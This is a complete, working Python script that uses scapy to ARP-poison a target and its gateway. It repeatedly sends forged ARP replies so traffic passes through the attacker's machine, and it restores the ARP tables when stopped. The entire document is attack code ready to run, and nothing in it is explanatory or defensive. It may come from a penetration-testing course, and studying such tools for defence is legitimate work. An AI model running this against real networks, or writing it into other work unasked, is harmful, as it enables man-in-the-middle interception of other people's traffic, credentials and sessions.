#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="This is the IP to spoof")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="This is the IP of the router")
    options = parser.parse_args()
    if options.target_ip is None:
        print("[!] Please enter an IP to spoof")
    if options.gateway_ip is None:
        print("[!] Please enter the router IP")
    return options

def get_mac(ip):
    #creating arp request
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    full_arp_request = broadcast/arp_request

    #sending the request
    answered = scapy.srp(full_arp_request, timeout=1, verbose=False)[0] #custom ether

    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #arp response
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

option = get_args()
try:
    sent_packets_count = 0
    while True:
        spoof(option.target_ip, option.gateway_ip)
        spoof(option.gateway_ip, option.target_ip)
        sent_packets_count += 2
        print("\r[+] Sent: {} packets".format(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Detected Ctrl + C ........ Stopping the ARP attack")
    restore(option.target_ip, option.gateway_ip)
    restore(option.gateway_ip, option.target_ip)

